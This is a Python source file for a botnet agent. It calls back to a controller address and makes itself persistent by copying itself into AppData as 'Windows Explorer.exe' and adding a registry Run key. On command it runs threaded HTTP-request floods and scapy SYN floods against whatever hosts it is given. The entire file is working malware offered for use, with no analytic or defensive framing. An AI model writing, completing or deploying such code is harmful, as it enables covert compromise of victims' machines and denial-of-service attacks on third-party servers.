
import socket
import subprocess
import threading
import time
import pickle
import random
import os
import signal
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import shutil

def sig_handler(sig, frame):
    print("\nExiting")
    os._exit(0)

signal.signal(signal.SIGINT, sig_handler)

class BackDoor:
    def __init__(self, ip, port):

        self.i = ip
        self.p = port

        #Connect Master
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        self.become_Persistent()
        self.connected = False

        while not self.connected:
            try:

                self.connection.connect((ip, port))
                self.connected = True

            except:
                time.sleep(3)
    
    def reliable_send(self, data):

        try:

            pdata = pickle.dumps(data)
            self.connection.send(pdata)

        except socket.error:

            time.sleep(3) 

            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            self.connected = False

            while not self.connected:

                try:

                    self.connection.connect((self.i, self.p))
                    self.connected = True

                except:

                    time.sleep(3) 
       
    def reliable_recieve(self):
        pdata = ""
        while True:
            try:
                
                pdata = self.connection.recv(1024)
                return pickle.loads(pdata)

            except EOFError:          
                continue  

    def become_Persistent(self):
        try:
            
            evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"

            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d + "'+ evil_file_location + '"', shell = True)     

        except KeyError:
            pass

    def Exit(self):
        self.connection.close()
        

    def KILL(self):
        exit()

    def error(self):
        return "\n[!] Incorrect Command"
    
    def attack(self, hosts, ports):

        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        soc.connect((hosts, ports))
    
        byt = random._urandom(51200)
        url = '/'
        fake_ip = '182.21.20.32'
        
        try:

            soc.send(byt)
            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+hosts+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+hosts+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())

        except socket.error as error:

            print(error)

        finally:

            soc.close()
    
    def execute(self, numreq, hosts, ports):
        for i in range(numreq):
            thread = threading.Thread(target=self.attack, args=(hosts, ports))
            thread.start()

            time.sleep(0.01)

        return "\n [!] Sever must be Dead [!]"

    def syn(self, hosts, ports):
    
        ip = hosts
        port = ports

        host = IP(dst=ip)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X" * 65000)
        p = host / tcp / raw
        send(p, loop=1, verbose=0)

    def ssyn(self, numreq, hosts, ports):
        for i in range(numreq):
            thread = threading.Thread(target=self.syn, args=(hosts, ports))
            thread.start()
            time.sleep(0.01)

        return "\n [!] Sever must be Dead [!]"


    def run(self):

        while True:  

            command = self.reliable_recieve()

            if command[0] == "exit":
                command_result = self.Exit()
            
            elif command[0] == "acttack" and len(command) > 1:
                
                command_result = self.execute(int(command[1]), command[2], int(command[3]))

            elif command[0] == "kill":
                
                command_result = self.KILL()

            elif command[0] == "syn" and len(command) > 1:
                
                command_result = self.ssyn(int(command[1]), command[2], int(command[3]))


            else:

                command_result = self.error()
            
            self.reliable_send(command_result)

Back = BackDoor("192.168.0.107", 1234)
Back.run()


